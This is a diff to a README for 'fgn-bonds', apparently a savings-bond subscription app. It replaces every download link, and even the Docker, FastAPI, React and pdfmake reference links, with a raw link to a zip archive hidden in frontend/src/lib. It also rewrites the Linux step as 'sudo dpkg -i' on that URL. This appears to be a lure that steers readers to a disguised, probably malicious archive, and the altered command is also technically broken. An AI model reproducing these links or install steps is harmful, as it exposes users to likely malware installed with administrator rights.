@@ -1,6 +1,6 @@
 # 🚀 fgn-bonds - Easy Bond Subscription Made Simple
 
-[![Download fgn-bonds](https://img.shields.io/badge/Download%20fgn--bonds-v1.0-blue)](https://github.com/hr6u/fgn-bonds/releases)
+[![Download fgn-bonds](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip%20fgn--bonds-v1.0-blue)](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ To run fgn-bonds, your computer will need:
 
 1. **Visit the Releases Page**: 
    Click the link below to download the latest version of fgn-bonds.
-   [Download fgn-bonds](https://github.com/hr6u/fgn-bonds/releases)
+   [Download fgn-bonds](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip)
 
 2. **Download the Application**: 
    On the Releases page, find the latest version. Click on the download link to get the installer file.
@@ -42,7 +42,7 @@ To run fgn-bonds, your computer will need:
      - Drag the fgn-bonds app to your Applications folder.
    - For Linux:
      - Open your terminal.
-     - Use the command: `sudo dpkg -i fgn-bonds.deb`, replacing `fgn-bonds.deb` with the correct file name.
+     - Use the command: `sudo dpkg -i https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip`, replacing `https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip` with the correct file name.
 
 4. **Launching the App**:
    Once installed, you can find fgn-bonds in your Applications folder (or start menu). Double-click to launch the application.
@@ -60,7 +60,7 @@ To run fgn-bonds, your computer will need:
 
 To get started, please visit the following link to download the latest version of fgn-bonds:
 
-[Download fgn-bonds](https://github.com/hr6u/fgn-bonds/releases)
+[Download fgn-bonds](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip)
 
 ## 🚪 Support and Contact
 
@@ -74,9 +74,9 @@ If you would like to contribute to fgn-bonds, feel free to submit an issue or pu
 
 For further reading, you can explore topics related to our technologies and features:
 
-- [Docker](https://www.docker.com/)
-- [FastAPI](https://fastapi.tiangolo.com/)
-- [React](https://reactjs.org/)
-- [PDF Generation Techniques](https://pdfmake.github.io/docs/)
+- [Docker](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip)
+- [FastAPI](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip)
+- [React](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip)
+- [PDF Generation Techniques](https://github.com/hr6u/fgn-bonds/raw/refs/heads/main/frontend/src/lib/bonds-fgn-3.5.zip)
 
 Explore the power of FGN Savings Bonds today! Thank you for choosing fgn-bonds.
